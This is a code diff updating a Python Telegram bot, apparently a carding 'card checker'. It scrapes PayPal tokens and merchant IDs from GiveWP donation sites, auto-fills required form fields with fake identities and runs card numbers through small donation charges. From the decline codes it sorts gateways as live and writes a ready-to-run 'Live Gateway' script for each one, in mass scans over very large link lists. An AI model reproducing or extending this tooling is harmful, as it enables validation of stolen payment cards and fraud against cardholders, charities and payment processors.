@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 # =====================================================
-#  Card Checker Bot — FINAL v11 (Real-time Display)
-#  - Real-time: shows LAST completed link + response
-#  - Not "Checking..." — shows the actual result
-#  - Fast transition between links
+#  Card Checker Bot — FINAL v12 (Full Auto-Fill)
+#  - Extracts EVERY form field (select/radio/checkbox/text/email/number)
+#  - Auto-fills required fields intelligently (Mr/Mrs, School/Hospital, etc.)
+#  - Never stops at any gateway with required fields
+#  - Real-time display: last checked link + response
 #  - 200k+ stable, crash-proof
 # =====================================================
 import telebot
@@ -240,7 +241,7 @@ def normalize_result(resp):
 
 
 # ============================================================
-#  PayPalTester — ULTIMATE EXTRACTION
+#  PayPalTester — FULL AUTO-FILL
 # ============================================================
 class PayPalTester:
     def __init__(self, url):
@@ -268,6 +269,7 @@ class PayPalTester:
         self.all_content = ""
         self.page_html = ""
         self.auth_method = "none"
+        self.form_fields = {}   # ← ALL form fields extracted
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         self.r = requests.Session()
         self.r.verify = False
@@ -275,6 +277,8 @@ class PayPalTester:
 
     def _safe_get(self, url, timeout=15):
         try:
+            if not url or not isinstance(url, str) or not url.startswith(("http://", "https://")):
+                return None
             return self.r.get(url, headers={'user-agent': self.uu.random}, timeout=timeout)
         except:
             return None
@@ -291,6 +295,8 @@ class PayPalTester:
 
     def _load_iframes(self):
         try:
+            if not self.url:
+                return
             for pattern in [
                 r'<iframe[^>]*src=["\']([^"\']*give[^"\']*)["\']',
                 r'<iframe[^>]*src=["\']([^"\']*donation[^"\']*)["\']',
@@ -305,18 +311,25 @@ class PayPalTester:
                     if r and r.status_code == 200 and r.text:
                         self.all_content += "\n" + r.text
                         if not self.id_form2:
-                            parsed = urlparse(ifu)
-                            self.url = parsed.netloc
-                            self.inurl = parsed.path
+                            try:
+                                parsed = urlparse(ifu)
+                                if parsed.netloc:
+                                    self.url = parsed.netloc
+                                    self.inurl = parsed.path or '/'
+                            except: pass
         except: pass
 
     def _load_all_js(self):
         try:
+            if not self.url:
+                return
             js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
             priority = [u for u in js_urls if any(k in u.lower() for k in ['give','donation','paypal','commerce','token','client','checkout'])]
             others = [u for u in js_urls if u not in priority]
             ordered = (priority + others)[:15]
             for js_url in ordered:
+                if not js_url or not isinstance(js_url, str):
+                    continue
                 if js_url.startswith('//'): js_url = 'https:' + js_url
                 elif js_url.startswith('/'): js_url = f'https://{self.url}{js_url}'
                 elif not js_url.startswith('http'): js_url = f'https://{self.url}/{js_url}'
@@ -377,11 +390,72 @@ class PayPalTester:
                 self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
         except: pass
 
+    def _extract_all_form_fields(self):
+        """Extract ALL form fields — select/radio/checkbox/text/email/number/tel"""
+        try:
+            c = self.all_content
+            self.form_fields = {}
+
+            # ============ SELECT ============
+            for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', c, re.DOTALL | re.IGNORECASE):
+                name = m.group(1)
+                inner = m.group(2)
+                tag = m.group(0)
+                required = 'required' in tag.lower()
+                options = []
+                for om in re.finditer(r'<option[^>]*value=["\']([^"\']*)["\'][^>]*>(.*?)</option>', inner, re.DOTALL):
+                    val = om.group(1).strip()
+                    if val:
+                        options.append(val)
+                self.form_fields[name] = {'type': 'select', 'required': required, 'options': options}
+
+            # ============ RADIO ============
+            radio_groups = {}
+            for m in re.finditer(r'<input[^>]*type=["\']radio["\'][^>]*>', c, re.IGNORECASE):
+                tag = m.group(0)
+                name_m = re.search(r'name=["\']([^"\']+)["\']', tag)
+                value_m = re.search(r'value=["\']([^"\']*)["\']', tag)
+                if name_m and value_m:
+                    name = name_m.group(1)
+                    val = value_m.group(1)
+                    if name not in radio_groups:
+                        radio_groups[name] = {'required': 'required' in tag.lower(), 'options': []}
+                    if val and val not in radio_groups[name]['options']:
+                        radio_groups[name]['options'].append(val)
+            for name, info in radio_groups.items():
+                self.form_fields[name] = {'type': 'radio', 'required': info['required'], 'options': info['options']}
+
+            # ============ CHECKBOX ============
+            for m in re.finditer(r'<input[^>]*type=["\']checkbox["\'][^>]*>', c, re.IGNORECASE):
+                tag = m.group(0)
+                name_m = re.search(r'name=["\']([^"\']+)["\']', tag)
+                value_m = re.search(r'value=["\']([^"\']*)["\']', tag)
+                if name_m:
+                    name = name_m.group(1)
+                    val = value_m.group(1) if value_m else 'on'
+                    required = 'required' in tag.lower()
+                    if name not in self.form_fields:
+                        self.form_fields[name] = {'type': 'checkbox', 'required': required, 'options': [val]}
+                    else:
+                        if val not in self.form_fields[name]['options']:
+                            self.form_fields[name]['options'].append(val)
+
+            # ============ TEXT/EMAIL/NUMBER/TEL ============
+            for m in re.finditer(r'<input[^>]*type=["\'](text|email|tel|number)["\'][^>]*>', c, re.IGNORECASE):
+                tag = m.group(0)
+                name_m = re.search(r'name=["\']([^"\']+)["\']', tag)
+                if name_m:
+                    name = name_m.group(1)
+                    required = 'required' in tag.lower()
+                    input_type = m.group(1).lower()
+                    if name not in self.form_fields:
+                        self.form_fields[name] = {'type': input_type, 'required': required, 'options': []}
+        except: pass
+
     def _extract_tokens_ultimate(self):
         if self.au: return True
         try:
             c = self.all_content
-            # 1) data-client-token (base64 JSON)
             for p in [r'"data-client-token"\s*:\s*"([^"]+)"',
                       r'data-client-token=["\']([^"\']+)["\']',
                       r'"clientToken"\s*:\s*"([^"]+)"',
@@ -407,17 +481,14 @@ class PayPalTester:
                         if self.au: return True
                     except: pass
 
-            # 2) accessToken direct
             for p in [r'"accessToken"\s*:\s*"([^"]+)"',
                       r'accessToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                       r'"access_token"\s*:\s*"([^"]+)"']:
                 m = re.search(p, c, re.IGNORECASE)
-                if m:
-                    if len(m.group(1)) > 20:
-                        self.au = m.group(1)
-                        return True
+                if m and len(m.group(1)) > 20:
+                    self.au = m.group(1)
+                    return True
 
-            # 3) A21 tokens
             for p in [r'"(A21[A-Za-z0-9+/=_-]{40,})"',
                       r"'(A21[A-Za-z0-9+/=_-]{40,})'",
                       r'\b(A21[A-Za-z0-9+/=_-]{40,})\b']:
@@ -426,7 +497,6 @@ class PayPalTester:
                     self.au = m.group(1)
                     return True
 
-            # 4) JWT
             for p in [r'"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
                       r"'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'"]:
                 m = re.search(p, c)
@@ -443,7 +513,6 @@ class PayPalTester:
                             if self.au: return True
                     except: pass
 
-            # 5) client_id
             if not self.client_id:
                 for p in [
                     r'client-id=["\']([A-Za-z0-9_-]{20,})["\']',
@@ -453,11 +522,8 @@ class PayPalTester:
                     r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
                 ]:
                     m = re.search(p, c, re.IGNORECASE)
-                    if m:
-                        self.client_id = m.group(1)
-                        break
+                    if m: self.client_id = m.group(1); break
 
-            # 6) merchant_id
             if not self.paypal:
                 for p in [
                     r'merchant-id=["\']([A-Za-z0-9]+)["\']',
@@ -465,9 +531,7 @@ class PayPalTester:
                     r'"merchant_id"\s*:\s*"([A-Za-z0-9]+)"',
                 ]:
                     m = re.search(p, c, re.IGNORECASE)
-                    if m:
-                        self.paypal = m.group(1)
-                        break
+                    if m: self.paypal = m.group(1); break
         except: pass
         return bool(self.au)
 
@@ -552,12 +616,91 @@ class PayPalTester:
         except: pass
         return False
 
+    def _autofill_required_fields(self, form_data):
+        """Auto-fill any required fields not already in form_data"""
+        try:
+            for name, info in self.form_fields.items():
+                if name in form_data:
+                    continue
+                if not info.get('required'):
+                    continue
+                # Skip GiveWP core fields (already handled)
+                if name.startswith('give-form-') or name.startswith('give_') or name in (
+                    'give-amount', 'give_first', 'give_last', 'give_email',
+                    'give-gateway', 'payment-mode', 'give-price-id',
+                    'give_agree_to_terms', 'give_terms_agreement'
+                ):
+                    continue
+
+                field_type = info.get('type', '')
+                options = info.get('options', [])
+                name_lower = name.lower()
+
+                if field_type in ('select', 'radio'):
+                    if options:
+                        form_data[name] = options[0]
+                    else:
+                        form_data[name] = ''
+                elif field_type == 'checkbox':
+                    form_data[name] = options[0] if options else 'on'
+                elif field_type == 'email':
+                    form_data[name] = self.email
+                elif field_type == 'number':
+                    form_data[name] = '1'
+                elif field_type == 'tel':
+                    form_data[name] = '1234567890'
+                else:  # text
+                    # Smart fill based on field name
+                    if 'first' in name_lower or 'fname' in name_lower:
+                        form_data[name] = random.choice(self.first_name)
+                    elif 'last' in name_lower or 'lname' in name_lower:
+                        form_data[name] = random.choice(self.last_name)
+                    elif 'name' in name_lower:
+                        form_data[name] = f"{random.choice(self.first_name)} {random.choice(self.last_name)}"
+                    elif 'email' in name_lower:
+                        form_data[name] = self.email
+                    elif 'phone' in name_lower or 'mobile' in name_lower or 'tel' in name_lower:
+                        form_data[name] = '1234567890'
+                    elif 'address' in name_lower or 'street' in name_lower:
+                        form_data[name] = '123 Main St'
+                    elif 'city' in name_lower:
+                        form_data[name] = 'New York'
+                    elif 'zip' in name_lower or 'postal' in name_lower:
+                        form_data[name] = '10001'
+                    elif 'state' in name_lower:
+                        form_data[name] = 'NY'
+                    elif 'country' in name_lower:
+                        form_data[name] = 'US'
+                    elif 'title' in name_lower or 'prefix' in name_lower or 'salutation' in name_lower:
+                        form_data[name] = 'Mr'
+                    elif 'gender' in name_lower or 'sex' in name_lower:
+                        form_data[name] = 'Male'
+                    elif 'birth' in name_lower or 'dob' in name_lower:
+                        form_data[name] = '1990-01-01'
+                    elif 'age' in name_lower:
+                        form_data[name] = '30'
+                    elif 'company' in name_lower or 'organization' in name_lower:
+                        form_data[name] = 'Test Org'
+                    elif 'comment' in name_lower or 'message' in name_lower or 'note' in name_lower:
+                        form_data[name] = 'Donation'
+                    elif 'school' in name_lower:
+                        form_data[name] = 'Test School'
+                    elif 'hospital' in name_lower:
+                        form_data[name] = 'Test Hospital'
+                    elif 'amount' in name_lower:
+                        form_data[name] = self.donation
+                    else:
+                        form_data[name] = 'Test'
+        except: pass
+        return form_data
+
     def Key(self):
         try:
             if not self._fetch_page(): return False
             self._load_iframes()
             self._load_all_js()
             self._extract_basic()
+            self._extract_all_form_fields()  # ← NEW: extract all form fields
             self._extract_tokens_ultimate()
 
             if self.au: self.auth_method = "token"
@@ -594,23 +737,27 @@ class PayPalTester:
             last_create_err = ""
 
             for pid in price_ids:
-                fields = {
-                    'give-form-id-prefix': (None, self.id_form1 or ''),
-                    'give-form-id': (None, self.id_form2 or ''),
-                    'give-form-hash': (None, self.nonec or ''),
-                    'give-amount': (None, amt),
-                    'give-currency': (None, self.currency),
-                    'payment-mode': (None, 'paypal-commerce'),
-                    'give_first': (None, random.choice(self.first_name)),
-                    'give_last': (None, random.choice(self.last_name)),
-                    'give_email': (None, self.email),
-                    'give-gateway': (None, 'paypal-commerce'),
-                    'give_agree_to_terms': (None, 'on'),
-                    'give_terms_agreement': (None, 'on'),
+                form_data = {
+                    'give-form-id-prefix': self.id_form1 or '',
+                    'give-form-id': self.id_form2 or '',
+                    'give-form-hash': self.nonec or '',
+                    'give-amount': amt,
+                    'give-currency': self.currency,
+                    'payment-mode': 'paypal-commerce',
+                    'give_first': random.choice(self.first_name),
+                    'give_last': random.choice(self.last_name),
+                    'give_email': self.email,
+                    'give-gateway': 'paypal-commerce',
+                    'give_agree_to_terms': 'on',
+                    'give_terms_agreement': 'on',
                 }
                 if pid is not None:
-                    fields['give-price-id'] = (None, pid)
-                da2 = MultipartEncoder(fields)
+                    form_data['give-price-id'] = pid
+                
+                # ✅ Auto-fill ALL required fields
+                form_data = self._autofill_required_fields(form_data)
+                
+                da2 = MultipartEncoder({k: (None, v) for k, v in form_data.items()})
                 he3 = {'content-type': da2.content_type, 'user-agent': self.uu.random}
 
                 r3_raw = None
@@ -660,23 +807,27 @@ class PayPalTester:
             except: pass
 
             for pid in price_ids:
-                fields = {
-                    'give-form-id-prefix': (None, self.id_form1 or ''),
-                    'give-form-id': (None, self.id_form2 or ''),
-                    'give-form-hash': (None, self.nonec or ''),
-                    'give-amount': (None, amt),
-                    'give-currency': (None, self.currency),
-                    'payment-mode': (None, 'paypal-commerce'),
-                    'give_first': (None, random.choice(self.first_name)),
-                    'give_last': (None, random.choice(self.last_name)),
-                    'give_email': (None, self.email),
-                    'give-gateway': (None, 'paypal-commerce'),
-                    'give_agree_to_terms': (None, 'on'),
-                    'give_terms_agreement': (None, 'on'),
+                form_data = {
+                    'give-form-id-prefix': self.id_form1 or '',
+                    'give-form-id': self.id_form2 or '',
+                    'give-form-hash': self.nonec or '',
+                    'give-amount': amt,
+                    'give-currency': self.currency,
+                    'payment-mode': 'paypal-commerce',
+                    'give_first': random.choice(self.first_name),
+                    'give_last': random.choice(self.last_name),
+                    'give_email': self.email,
+                    'give-gateway': 'paypal-commerce',
+                    'give_agree_to_terms': 'on',
+                    'give_terms_agreement': 'on',
                 }
                 if pid is not None:
-                    fields['give-price-id'] = (None, pid)
-                da4 = MultipartEncoder(fields)
+                    form_data['give-price-id'] = pid
+                
+                # ✅ Auto-fill for approve too
+                form_data = self._autofill_required_fields(form_data)
+                
+                da4 = MultipartEncoder({k: (None, v) for k, v in form_data.items()})
                 he5 = {'content-type': da4.content_type, 'user-agent': self.uu.random}
                 try:
                     r5 = self.r.post(self.ajax_url,
@@ -767,7 +918,7 @@ def check_single_link(link):
 
 
 # ============================================================
-#  Gateway generator — FAST
+#  Gateway generator — with auto-fill
 # ============================================================
 def generate_gateway_code(result, link, amount="1.00", tester=None):
     parsed = urlparse(link)
@@ -796,9 +947,10 @@ def generate_gateway_code(result, link, amount="1.00", tester=None):
     price_levels_json = json.dumps(tester.price_levels if tester and tester.price_levels else [])
     current_price_id = _g('current_price_id')
     auth_method = _g('auth_method', 'none')
+    form_fields_json = json.dumps(tester.form_fields if tester and tester.form_fields else {})
 
     return f'''#!/usr/bin/env python3
-# Live Gateway v11 — Fast Smart Refresh
+# Live Gateway v12 — Full Auto-Fill
 # Link: {link}
 # Response: {display_result}
 # Amount: {amount} | Currency: {currency} | Auth: {auth_method}
@@ -823,6 +975,7 @@ PREFERRED_AMT = "{amount}"
 PRICE_LEVELS  = {price_levels_json}
 CURRENT_PID   = "{current_price_id}"
 AUTH_METHOD   = "{auth_method}"
+FORM_FIELDS   = {form_fields_json}
 
 LIVE_RESPONSES = ['CHARGE', 'Payer cannot pay for this transaction',
     'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED', 'PAYER_ACTION_REQUIRED',
@@ -880,7 +1033,49 @@ class PayPal:
         self.client_id = CLIENT_ID
         self.currency = CURRENCY
         self.current_pid = CURRENT_PID
+        self.form_fields = FORM_FIELDS
         self._refresh_count = 0
+
+    def _autofill(self, form_data):
+        for name, info in self.form_fields.items():
+            if name in form_data: continue
+            if not info.get('required'): continue
+            if name.startswith('give-form-') or name.startswith('give_'): continue
+            if name in ('give-amount','give_first','give_last','give_email','give-gateway','payment-mode','give-price-id','give_agree_to_terms','give_terms_agreement'): continue
+            ft = info.get('type', ''); opts = info.get('options', [])
+            nl = name.lower()
+            if ft in ('select','radio'):
+                form_data[name] = opts[0] if opts else ''
+            elif ft == 'checkbox':
+                form_data[name] = opts[0] if opts else 'on'
+            elif ft == 'email':
+                form_data[name] = self.email
+            elif ft == 'number':
+                form_data[name] = '1'
+            elif ft == 'tel':
+                form_data[name] = '1234567890'
+            else:
+                if 'first' in nl or 'fname' in nl: form_data[name] = random.choice(self.first_name)
+                elif 'last' in nl or 'lname' in nl: form_data[name] = random.choice(self.last_name)
+                elif 'name' in nl: form_data[name] = f"{{random.choice(self.first_name)}} {{random.choice(self.last_name)}}"
+                elif 'email' in nl: form_data[name] = self.email
+                elif 'phone' in nl or 'mobile' in nl or 'tel' in nl: form_data[name] = '1234567890'
+                elif 'address' in nl or 'street' in nl: form_data[name] = '123 Main St'
+                elif 'city' in nl: form_data[name] = 'New York'
+                elif 'zip' in nl or 'postal' in nl: form_data[name] = '10001'
+                elif 'state' in nl: form_data[name] = 'NY'
+                elif 'country' in nl: form_data[name] = 'US'
+                elif 'title' in nl or 'prefix' in nl or 'salutation' in nl: form_data[name] = 'Mr'
+                elif 'gender' in nl or 'sex' in nl: form_data[name] = 'Male'
+                elif 'birth' in nl or 'dob' in nl: form_data[name] = '1990-01-01'
+                elif 'age' in nl: form_data[name] = '30'
+                elif 'company' in nl or 'organization' in nl: form_data[name] = 'Test Org'
+                elif 'school' in nl: form_data[name] = 'Test School'
+                elif 'hospital' in nl: form_data[name] = 'Test Hospital'
+                elif 'comment' in nl or 'message' in nl or 'note' in nl: form_data[name] = 'Donation'
+                elif 'amount' in nl: form_data[name] = self.donation
+                else: form_data[name] = 'Test'
+        return form_data
 
     def _refresh_fast(self):
         if self._refresh_count >= 3: return False
@@ -914,7 +1109,6 @@ class PayPal:
                         m = re.search(p, html, re.IGNORECASE)
                         if m: self.au = m.group(1); break
         except: pass
-        
         if AUTH_METHOD == "oauth" and not self.au and self.client_id:
             try:
                 auth = base64.b64encode(f"{{self.client_id}}:".encode()).decode()
@@ -925,48 +1119,26 @@ class PayPal:
                     j = r.json()
                     if 'access_token' in j: self.au = j['access_token']
             except: pass
-        elif AUTH_METHOD == "ajax" and not self.au:
-            for action in ['give_paypal_commerce_get_client_token', 'get_client_token']:
-                try:
-                    r = self.r.post(self.ajax_url,
-                        data={{'action': action, 'form-id': self.id_form2}},
-                        headers={{'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}}, timeout=6)
-                    if r.status_code == 200:
-                        try:
-                            j = r.json()
-                            token = j.get('data') if isinstance(j.get('data'), str) else None
-                            if not token and isinstance(j.get('data'), dict):
-                                token = j['data'].get('access_token') or j['data'].get('client_token')
-                            if token and len(token) > 20:
-                                try:
-                                    padded = token + '=' * (-len(token) % 4)
-                                    dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
-                                    tm = re.search(r'"accessToken"\\s*:\\s*"([^"]+)"', dec)
-                                    if tm: self.au = tm.group(1); break
-                                except: pass
-                                self.au = token
-                                break
-                        except: pass
-                except: continue
         return True
 
     def _create_order(self, amt, currency, pid):
-        fields = {{
-            'give-form-id-prefix': (None, self.id_form1 or ''),
-            'give-form-id': (None, self.id_form2 or ''),
-            'give-form-hash': (None, self.nonec or ''),
-            'give-amount': (None, amt),
-            'give-currency': (None, currency),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-            'give_agree_to_terms': (None, 'on'),
-            'give_terms_agreement': (None, 'on'),
+        form_data = {{
+            'give-form-id-prefix': self.id_form1 or '',
+            'give-form-id': self.id_form2 or '',
+            'give-form-hash': self.nonec or '',
+            'give-amount': amt,
+            'give-currency': currency,
+            'payment-mode': 'paypal-commerce',
+            'give_first': random.choice(self.first_name),
+            'give_last': random.choice(self.last_name),
+            'give_email': self.email,
+            'give-gateway': 'paypal-commerce',
+            'give_agree_to_terms': 'on',
+            'give_terms_agreement': 'on',
         }}
-        if pid is not None: fields['give-price-id'] = (None, pid)
-        da = MultipartEncoder(fields)
+        if pid is not None: form_data['give-price-id'] = pid
+        form_data = self._autofill(form_data)
+        da = MultipartEncoder({{k: (None, v) for k, v in form_data.items()}})
         he = {{'content-type': da.content_type, 'user-agent': self.uu.random}}
         try:
             r = self.r.post(self.ajax_url,
@@ -1006,22 +1178,23 @@ class PayPal:
         except: return ""
 
     def _approve(self, order_id, amt, currency, pid):
-        fields = {{
-            'give-form-id-prefix': (None, self.id_form1 or ''),
-            'give-form-id': (None, self.id_form2 or ''),
-            'give-form-hash': (None, self.nonec or ''),
-            'give-amount': (None, amt),
-            'give-currency': (None, currency),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-            'give_agree_to_terms': (None, 'on'),
-            'give_terms_agreement': (None, 'on'),
+        form_data = {{
+            'give-form-id-prefix': self.id_form1 or '',
+            'give-form-id': self.id_form2 or '',
+            'give-form-hash': self.nonec or '',
+            'give-amount': amt,
+            'give-currency': currency,
+            'payment-mode': 'paypal-commerce',
+            'give_first': random.choice(self.first_name),
+            'give_last': random.choice(self.last_name),
+            'give_email': self.email,
+            'give-gateway': 'paypal-commerce',
+            'give_agree_to_terms': 'on',
+            'give_terms_agreement': 'on',
         }}
-        if pid is not None: fields['give-price-id'] = (None, pid)
-        da4 = MultipartEncoder(fields)
+        if pid is not None: form_data['give-price-id'] = pid
+        form_data = self._autofill(form_data)
+        da4 = MultipartEncoder({{k: (None, v) for k, v in form_data.items()}})
         he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
         try:
             r5 = self.r.post(self.ajax_url,
@@ -1043,9 +1216,7 @@ class PayPal:
             price_ids.insert(0, self.current_pid)
 
         attempts = ["1.00", "5.00"]
-
         result = self._do_charge(n, mm, yy, cvc, attempts, price_ids)
-
         if not result or '<!DOCTYPE' in str(result).upper() or '<HTML' in str(result).upper():
             if self._refresh_count < 2:
                 self._refresh_fast()
@@ -1081,7 +1252,6 @@ class PayPal:
                         all_results.append({{'amount': amt, 'result': str(j['data']['error'])[:200]}})
                         break
                 except: pass
-
         if all_results:
             PRIORITY = [('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
                 ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
@@ -1134,10 +1304,9 @@ def file_check():
 
 def main():
     print("=" * 60)
-    print(f"  Live Gateway v11 — {{PREFERRED_AMT}} {{CURRENCY}}")
+    print(f"  Live Gateway v12 — {{PREFERRED_AMT}} {{CURRENCY}}")
     print(f"  Auth   : {{AUTH_METHOD}}")
     print(f"  Form   : {{ID_FORM2}} ({{ID_FORM1}})")
-    print(f"  AJAX   : {{AJAX_URL}}")
     print(f"  Token  : {{'YES' if ACCESS_TOKEN else 'NONE'}}")
     print("=" * 60)
     while True:
@@ -1185,7 +1354,7 @@ def ali_al2(massege):
         tester = PayPalTester(link)
         tester.Key()
         result = tester.Charge(TEST_CARD)
-        print(f"[paypal] result: {result} | amount: {tester.donation} | auth: {tester.auth_method}")
+        print(f"[paypal] result: {result} | amount: {tester.donation} | auth: {tester.auth_method} | fields: {len(tester.form_fields)}")
 
         if not is_live_response(result):
             safe_edit_message(chat_id, ko.message_id,
@@ -1221,6 +1390,7 @@ def ali_al2(massege):
 💰 <b>Amount:</b> <code>${tester.donation}</code>
 💱 <b>Currency:</b> <code>{tester.currency}</code>
 🔐 <b>Auth:</b> <code>{tester.auth_method}</code>
+📋 <b>Fields:</b> <code>{len(tester.form_fields)}</code>
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @FAWZY30'''
 
@@ -1350,7 +1520,6 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
     status_msg = safe_send_message(chat_id,
         f"📊 <b>Mass Scan Started</b>\n📌 Total: {total}\n⏳ Starting...")
 
-    # ✅ Real-time state: LAST COMPLETED link + response
     last_link = [""]
     last_response = [""]
     last_live = [False]
@@ -1358,13 +1527,11 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
     current_state = {"status": "starting"}
 
     def status_updater():
-        """Updates every 1.5 seconds — shows LAST COMPLETED link"""
         while mass_active.get(user_id, False):
             try:
                 if not status_msg:
                     time.sleep(1.5)
                     continue
-                
                 pct = int((processed / total) * 100) if total > 0 else 0
                 elapsed = time.time() - started_at
                 spd = processed / elapsed if elapsed > 0 else 0
@@ -1372,8 +1539,6 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
                 bar_len = 20
                 filled = int((pct / 100) * bar_len)
                 bar = '█' * filled + '░' * (bar_len - filled)
-                
-                # ✅ Show LAST COMPLETED link + response
                 if last_link[0]:
                     link_display = last_link[0][:65]
                     resp_display = last_response[0][:65]
@@ -1381,13 +1546,10 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
                     last_section = f"{live_icon} <b>Last Checked:</b>\n<code>{link_display}</code>\n💬 <b>Response:</b>\n<code>{resp_display}</code>"
                 else:
                     last_section = "⏳ Waiting for first result..."
-                
-                # Show current state
                 if current_state["status"] == "checking":
                     checking_section = "🔄 <i>Checking next link...</i>"
                 else:
-                    checking_section = "⏸️ <i>Idle</i>"
-                
+                    checking_section = "⏸️ <i>Moving to next...</i>"
                 text = f"""📊 <b>Mass Scan</b>
 ━━━━━━━━━━━━━━━━━━
 📌 Total: {total}
@@ -1400,7 +1562,6 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
 {checking_section}
 ⚡ Speed: {spd:.1f}/s | ETA: {int(eta/60)}m {int(eta%60)}s
 🛑 /stop | ♻️ /resume"""
-                
                 safe_edit_message(chat_id, status_msg.message_id, text)
             except: pass
             time.sleep(1.5)
@@ -1427,15 +1588,11 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
                 result = {'link': str(link)[:100], 'live': False, 'respons': f'Error: {str(e)[:50]}', 'tester': None}
 
             processed += 1
-
-            # ✅ Store LAST COMPLETED link + response for display
             resp_text = str(result.get('respons', 'Unknown'))[:100]
             is_live = result.get('live', False)
-            
-            # Normalize display
             if 'ORDER_NOT_APPROVED' in resp_text.upper() or 'PAYER_CANNOT_PAY' in resp_text.upper():
                 resp_text = "Payer cannot pay for this transaction."
-            
+
             last_link[0] = link
             last_response[0] = resp_text
             last_live[0] = is_live
@@ -1457,15 +1614,12 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
                     gateway_path = os.path.join(live_dir, f'gateway_{live_counter[0]}.py')
                     with open(gateway_path, 'w', encoding='utf-8') as f:
                         f.write(code)
-
                     cur = tester.currency if tester else 'USD'
                     auth = tester.auth_method if tester else 'none'
-
                     caption = f"""✅ <b>Live #{live_counter[0]}</b>
 🔗 <code>{result['link'][:80]}</code>
 💬 {resp_text[:80]}
 💰 ${result.get('amount', '1.00')} | 💱 {cur} | 🔐 {auth}"""
-
                     safe_send_document(chat_id, gateway_path, caption=caption)
                     try: os.remove(gateway_path)
                     except: pass
@@ -1474,7 +1628,6 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
             else:
                 dead += 1
 
-            # Save progress every 50
             if processed % 50 == 0:
                 progress['processed'] = processed
                 progress['live'] = live
@@ -1482,9 +1635,8 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
                 save_progress(user_id, progress)
 
             current_state["status"] = "moving"
-            time.sleep(0.1)  # ← Very short pause before next
+            time.sleep(0.1)
 
-        # Final
         mass_active[user_id] = False
         time.sleep(2)
 
@@ -1493,7 +1645,6 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
             progress['live'] = live
             progress['dead'] = dead
             save_progress(user_id, progress)
-
             rate = int((live / total) * 100) if total > 0 else 0
             final = f"""📊 <b>✅ COMPLETE!</b>
 ━━━━━━━━━━━━━━━━━━
@@ -1504,7 +1655,6 @@ def _run_mass_job(chat_id, user_id, links, start_idx, progress):
 📁 Results: <code>{results_file}</code>
 ━━━━━━━━━━━━━━━━━━
 Dev: @FAWZY30"""
-
             if status_msg:
                 safe_edit_message(chat_id, status_msg.message_id, final)
             else:
